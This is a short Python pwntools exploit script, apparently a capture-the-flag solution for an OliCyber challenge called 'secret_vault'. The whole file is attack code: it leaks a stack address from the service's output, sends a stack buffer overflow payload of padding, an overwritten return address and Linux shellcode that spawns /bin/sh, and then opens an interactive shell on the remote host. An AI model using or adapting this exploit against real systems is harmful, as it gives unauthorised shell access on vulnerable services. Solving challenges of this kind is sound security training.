from pwn import *

context.arch = "amd64"

SHELLCODE = asm(shellcraft.amd64.linux.sh())

# io = process("./secret_vault")
io = remote("vault.challs.olicyber.it", 10006)

io.sendlineafter(b">", b"1")
io.sendlineafter(b"messaggio:", b"a")

ADDR = p64(int(io.recvuntil(b"Scegli").split()[-2][2:-1], 16) + 96)
payload = b"a" * 88 + ADDR + SHELLCODE

io.sendlineafter(b">", b"1")
io.sendlineafter(b"messaggio:", payload)

io.sendlineafter(b">", b"3")
io.interactive()

